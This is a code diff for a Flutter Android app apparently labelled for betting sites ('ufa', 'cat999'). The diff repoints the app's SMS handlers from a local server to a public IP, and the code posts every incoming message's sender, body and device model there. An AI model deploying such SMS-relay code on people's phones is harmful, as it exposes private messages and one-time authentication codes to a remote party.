@@ -15,8 +15,7 @@ onBackgroundMessage(SmsMessage message) async {
     debugPrint('Running on ${androidInfo.model}');
 
     Map<String, dynamic> body = {
-      'bid': '1',
-      'web': 'ufa',
+      'web': 'cat999',
       'deviceID': androidInfo.model,
       'address': message.address,
       'message': message.body,
@@ -24,16 +23,12 @@ onBackgroundMessage(SmsMessage message) async {
     };
     String jsonBody = json.encode(body);
 
-    var array = ['http://192.168.68.198:9999/sms/sms'];
-
-    for (var i = 0; i < array.length; i++) {
-      await http.post(Uri.parse(array[i]),
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded",
-          },
-          encoding: Encoding.getByName('utf-8'),
-          body: jsonBody);
-    }
+    await http.post(Uri.parse('http://188.166.231.150:4000/sms/sms'),
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        encoding: Encoding.getByName('utf-8'),
+        body: jsonBody);
   } catch (e) {
     print(e);
   }
@@ -71,8 +66,7 @@ class _MyAppState extends State<MyApp> {
       debugPrint('Running on ${androidInfo.model}');
 
       Map<String, dynamic> body = {
-        'bid': '1',
-        'web': 'ufa',
+        'web': 'cat999',
         'deviceID': androidInfo.model,
         'address': message.address,
         'message': message.body,
@@ -80,16 +74,12 @@ class _MyAppState extends State<MyApp> {
       };
       String jsonBody = json.encode(body);
 
-      var array = ['http://192.168.68.198:9999/sms/sms'];
-
-      for (var i = 0; i < array.length; i++) {
-        await http.post(Uri.parse(array[i]),
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded",
-            },
-            encoding: Encoding.getByName('utf-8'),
-            body: jsonBody);
-      }
+      await http.post(Uri.parse('http://188.166.231.150:4000/sms/sms'),
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+          },
+          encoding: Encoding.getByName('utf-8'),
+          body: jsonBody);
     } catch (e) {
       print(e);
     }
@@ -123,7 +113,7 @@ class _MyAppState extends State<MyApp> {
     return MaterialApp(
         home: Scaffold(
       appBar: AppBar(
-        title: const Text('UFA 01'),
+        title: const Text('SMS CAT999'),
       ),
       body: Column(
         mainAxisAlignment: MainAxisAlignment.center,
